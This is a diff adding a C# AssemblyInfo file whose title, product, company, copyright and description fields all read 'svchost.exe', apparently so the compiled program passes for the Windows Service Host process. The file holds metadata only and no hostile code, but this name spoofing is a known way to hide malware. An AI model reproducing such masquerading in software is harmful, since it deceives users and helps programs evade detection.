@@ -1,0 +1,19 @@
+using System.Diagnostics;
+using System.Reflection;
+using System.Resources;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Runtime.Versioning;
+
+[assembly: Guid("6dce2a23-9b0b-45d9-b801-38d1c557e13d")]
+[assembly: ComVisible(false)]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyFileVersion("2.0.2.2")]
+[assembly: NeutralResourcesLanguage("en-US")]
+[assembly: AssemblyCopyright("svchost.exe")]
+[assembly: AssemblyTitle("svchost.exe")]
+[assembly: AssemblyDescription("svchost.exe")]
+[assembly: AssemblyProduct("svchost.exe")]
+[assembly: AssemblyCompany("svchost.exe")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyVersion("2.0.2.2")]
